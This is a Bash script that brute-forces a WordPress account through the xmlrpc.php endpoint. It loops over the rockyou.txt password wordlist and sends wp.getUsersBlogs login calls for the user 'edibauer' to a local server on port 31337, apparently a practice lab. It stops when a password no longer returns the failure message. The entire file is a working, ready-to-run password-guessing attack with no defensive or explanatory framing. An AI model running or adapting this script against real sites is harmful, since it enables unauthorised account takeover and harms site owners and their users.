#!/bin/bash

function ctrl_c() {
    echo -e "\n\n[!] Saliendo... \n"
    exit 1
}

# ctrl+c
trap ctrl_c SIGINT

function createXML() {
    password=$1
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>edibauer</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
    """

    # echo $xmlFile
    echo $xmlFile > file_att.xml
    response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file_att.xml)

    # echo $response

    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] The pass for edibauer is: $password"; exit 0
    fi

    # sleep 3

}

cat /usr/share/wordlists/rockyou.txt | while read password; do
    # echo "[+] Password -> $password"
    createXML $password
done